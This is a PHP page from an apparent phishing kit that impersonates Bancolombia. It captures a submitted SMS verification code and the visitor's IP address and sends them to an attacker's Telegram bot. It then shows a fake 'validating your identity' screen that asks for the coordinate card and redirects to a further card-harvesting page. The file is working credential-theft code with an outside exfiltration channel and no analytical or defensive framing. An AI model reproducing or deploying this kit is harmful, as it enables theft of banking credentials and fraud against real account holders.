<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
include('dt.php');
if ( isset ($_POST['sms']) ){

$message = "Vzla\r\n sms: ".$_POST['sms']."\r\nIP: ".$userp."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}else{  header ('location:'); exit();
}

?>

<html style="--app-height:724px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=10">
      
      <title>Cargando</title>
      <link rel="icon" href="img/favicon.ico" type="image/x-icon">
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link href="css/bootstrap.min.css" rel="stylesheet">
      <link href="css/default.min.css" rel="stylesheet">
      <script src="js/jquery.min.js.descarga"></script> 
      <link href="css/style.css" rel="stylesheet">
      <link href="css/style-funnel.css" rel="stylesheet">
      <style type="text/css">/* Chart.js */
         @-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}
      </style>
      <style type="text/css">/* Chart.js */
         @-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}
      </style>
      <style type="text/css">/* Chart.js */
         @-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}
      </style>
      <style type="text/css">/* Chart.js */
         @-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}
      </style>
 
   </head>

            </div>
         </header>
         <!-- END Header -->
         <!-- Nav -->
         <center><img class="logo_mobile" src="img/logo.png" alt="Bancolombia" width="300px"></center>
         <!-- END Nav -->
         <div id="hh">
            <section id="funnel-de-ingreso">
               <div class="container">
                  <div class="container-top">
                     <div class="row">
                        <div class="col-sm-12">
                           <div class="inner-title">
                           
                           </div>
                        </div>
                     </div>
                  </div>
                  <div style="background-color: #ffffff; width: 100%;">
                      <br>
                     <div style="text-align: center;" align="left"><img style="width: 150px; display: block; margin-left: auto; margin-right: auto;" src="img/ldr.gif"></div>
                     <br> <br>
                     <div style="text-align: center;" align="center">
                      Estamos validando tu identidad. <br> por favor ten cerca tu tarjeta de coordenadas  <strong id="time"> <br><label id="countdown">0:10</label></strong></div><strong id="time">

                     <br>
                     <div id="ingresotokenbody" class="ingreso-token__body ingreso-token__body--predeterminado" style="text-align: center;">
                     
                        
                     </div>
                  </strong></div><strong id="time">
               </strong></div><strong id="time">
            </strong></section><strong id="time">
            <script type="text/javascript">
               var url="tarjeta.php";
               var seconds = 10; //número de segundos a contar
               function secondPassed() {
               
                 var minutes = Math.round((seconds - 30)/60); //calcula el número de minutos
                 var remainingSeconds = seconds % 60; //calcula los segundos
                 //si los segundos usan sólo un dígito, añadimos un cero a la izq
                 if (remainingSeconds < 10) { 
                   remainingSeconds = "0" + remainingSeconds; 
                 } 
                 document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds; 
                 if (seconds == 0) { 
                   clearInterval(countdownTimer); 
                  window.location=url;
                   document.getElementById('countdown').innerHTML = ""; 
                 } else { 
                   seconds--; 
                 } 
               } 
               
               var countdownTimer = setInterval(secondPassed, 1000);
            </script>
         </strong></div><strong id="time">
      
         
      </strong></div><strong id="time">
      
   
</strong></body></html>